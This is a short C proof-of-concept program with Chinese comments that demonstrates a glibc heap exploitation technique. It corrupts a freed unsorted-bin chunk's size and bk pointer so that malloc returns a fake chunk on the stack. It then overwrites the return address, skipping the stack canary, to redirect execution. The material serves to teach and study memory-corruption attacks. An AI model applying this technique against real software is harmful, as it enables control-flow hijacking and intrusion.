#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

void jackpot(){ fprintf(stderr, "Nice jump d00d\n"); exit(0); }

int main() {
  intptr_t stack_buffer[4] = {0};

  fprintf(stderr, "先申请 victim chunk\n");
  intptr_t* victim = malloc(0x100);

  fprintf(stderr, "再申请一块防止与 top chunk 合并\n");
  intptr_t* p1 = malloc(0x100);

  fprintf(stderr, "把 %p 这块给释放掉, 会被放进 unsorted bin 中\n", victim);
  free(victim);

  fprintf(stderr, "在栈上伪造一个 chunk");
  fprintf(stderr, "设置 size 与指向可写地址的 bk 指针");
  stack_buffer[1] = 0x100 + 0x10;
  stack_buffer[3] = (intptr_t)stack_buffer;

  //------------VULNERABILITY-----------
  fprintf(stderr, "假设有一个漏洞可以覆盖 victim 的 size 和 bk 指针\n");
  fprintf(stderr, "大小应与下一个请求大小不同，以返回 fake chunk 而不是这个，并且需要通过检查（2*SIZE_SZ 到 av->system_mem）\n");
  victim[-1] = 32;
  victim[1] = (intptr_t)stack_buffer; // victim->bk is pointing to stack

  fprintf(stderr, "现在 malloc 的时候将会返回构造的那个 fake chunk 那里: %p\n", &stack_buffer[2]);
  char *p2 = malloc(0x100);
  fprintf(stderr, "malloc(0x100): %p\n", p2);

  intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
  memcpy((p2+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
}
